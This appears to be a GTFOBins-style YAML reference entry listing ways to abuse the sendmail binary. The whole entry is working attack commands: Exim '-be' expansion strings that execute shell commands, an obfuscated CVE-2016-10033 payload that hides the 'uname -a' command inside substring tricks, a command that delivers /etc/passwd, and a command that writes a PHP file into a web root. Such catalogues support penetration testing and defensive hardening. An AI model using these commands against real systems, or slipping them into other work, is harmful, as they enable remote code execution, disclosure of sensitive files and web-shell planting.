---
description: sendmail differs between systems, depending on whether it is postfix, exim, or otherwise, which provides the binary.
functions:
  command:
    - description: The -be flag can be used to execute system commands, when sendmail is provided by Exim4. 
      code: |
        sendmail -be '${run{/bin/sh -c "uname -a"}{yes}{no}}'
    - description: See [\"PoC HTTP request / minimal PoC exploit\"](https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html) for more information about this exploit. This example runs `uname -a`.
      code: |
        sendmail -t -i -f 'email@address.com(tmp1' -be '${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}uname${substr{10}{1}{$tod_log}}-a$}}' 'tmp2)'
  file-upload:
    - description: Arbitrary files can be delivered.
      code: |
        sendmail -t -i -f mail@address.com -C/etc/passwd -X/dev/null < mail.txt
  file-write:
    - description: Arbitrary local files can be written to a new location. It is worthy of playing around with the ability to upload files/the contents of the mail being sent.
      code: |
        sendmail -t -i -f mail@address.com -X/var/www/html/exploit.php < mail.txt
---
